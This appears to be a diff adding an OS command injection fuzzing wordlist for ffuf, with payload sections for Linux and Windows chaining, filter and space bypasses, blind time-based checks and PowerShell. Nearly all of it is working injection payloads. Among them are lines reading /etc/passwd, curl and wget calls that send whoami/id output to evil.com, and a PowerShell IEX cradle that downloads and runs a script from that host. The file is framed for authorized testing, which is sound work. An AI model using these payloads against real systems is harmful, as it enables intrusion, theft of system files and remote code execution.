@@ -1,0 +1,189 @@
+# ============================================================
+# OS Command Injection Fuzzing Wordlist
+# Usage: ffuf -u http://example.com/ping?host=FUZZ -w this_file.txt
+# For authorized security testing only.
+# Replace "id" / "whoami" with a Burp Collaborator ping for blind cases.
+# ============================================================
+
+# ---------------------------------------
+# SECTION 1: Basic chaining - Linux
+# ---------------------------------------
+; id
+; whoami
+; uname -a
+; id;
+; id #
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+;id
+|id
+&id
+;whoami
+|whoami
+&&whoami
+; cat /etc/passwd
+| cat /etc/passwd
+&& cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; ls -la
+| ls -la
+&& ls -la
+; pwd
+| pwd
+&& pwd
+
+# ---------------------------------------
+# SECTION 2: Basic chaining - Windows
+# ---------------------------------------
+& whoami
+&& whoami
+| whoami
+|| whoami
+& dir
+&& dir
+| dir
+&& type C:\windows\win.ini
+& type C:\windows\win.ini
+| type C:\windows\win.ini
+& net user
+&& net user
+| ver
+& ver
+& systeminfo
+&& systeminfo
+
+# ---------------------------------------
+# SECTION 3: Newline / separator based
+# ---------------------------------------
+%0aid
+%0awhoami
+%0a id
+%0d%0aid
+%0d%0a id
+\nid
+\n whoami
+%0a cat /etc/passwd
+%0a ls
+%0acat%20/etc/passwd
+
+# ---------------------------------------
+# SECTION 4: Space filter bypass
+# ---------------------------------------
+;id${IFS}
+;{cat,/etc/passwd}
+;cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+;cat</etc/passwd
+;cat<>/etc/passwd
+%09id
+;id%09
+;{ls,-la}
+;{id}
+;X=$'cat\x20/etc/passwd';$X
+
+# ---------------------------------------
+# SECTION 5: Blacklist / filter bypass obfuscation
+# ---------------------------------------
+;i''d
+;i""d
+;'i'd
+;i\d
+;/???/??t /???/p??s??
+;$(printf 'id')
+;`printf id`
+;ec\ho vulnerable
+;e''cho vulnerable
+;w'h'o'am'i
+;who$@ami
+;who''ami
+;/bin/cat /etc/passwd
+;/usr/bin/id
+;p\ing -c 1 127.0.0.1
+
+# ---------------------------------------
+# SECTION 6: Backtick / subshell variants
+# ---------------------------------------
+`id`
+`whoami`
+`uname -a`
+$(id)
+$(whoami)
+$(uname -a)
+$(sleep 5)
+`sleep 5`
+${IFS}$(id)${IFS}
+$( $(echo aWQ=|base64${IFS}-d) )
+
+# ---------------------------------------
+# SECTION 7: Time-based blind detection
+# ---------------------------------------
+; sleep 5
+| sleep 5
+&& sleep 5
+`sleep 5`
+$(sleep 5)
+; sleep 10
+%0asleep 5
+& timeout 5
+&& timeout /t 5
+& ping -n 5 127.0.0.1
+&& ping -n 5 127.0.0.1
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+
+# ---------------------------------------
+# SECTION 8: Out-of-band / DNS exfil (replace evil.com with your Collaborator)
+# ---------------------------------------
+; nslookup evil.com
+| nslookup evil.com
+&& nslookup evil.com
+`nslookup evil.com`
+$(nslookup evil.com)
+; curl http://evil.com/$(whoami)
+; wget http://evil.com/$(id)
+; curl http://evil.com/`whoami`
+&& curl evil.com
+; ping -c 1 evil.com
+| ping -c 1 evil.com
+`ping -c 1 evil.com`
+
+# ---------------------------------------
+# SECTION 9: PowerShell specific (Windows)
+# ---------------------------------------
+; powershell -c "whoami"
+| powershell -c "id"
+& powershell.exe -c "Get-Process"
+&& powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/x.ps1')"
+; powershell -enc <base64>
+& powershell -nop -c "whoami"
+
+# ---------------------------------------
+# SECTION 10: Quoted / escaped context breakout
+# ---------------------------------------
+" ; id ; "
+' ; id ; '
+"; id #
+'; id #
+"&&id&&"
+'&&id&&'
+"|id|"
+$(id)"
+`id`"
+";whoami;"
+
+# ---------------------------------------
+# NOTES
+# ---------------------------------------
+# - Always test with harmless commands first (id, whoami, echo, sleep)
+#   before anything destructive; never run rm, wget+exec, etc. without
+#   explicit written authorization and scope confirmation.
+# - Use Section 7 (sleep/ping delays) for blind injection where output
+#   isn't reflected; measure response time deltas.
+# - Use Section 8 (DNS/HTTP callbacks to your own Collaborator/interact.sh
+#   domain) for fully blind, non-time-based confirmation.
+# - Only use against systems you are explicitly authorized to test.
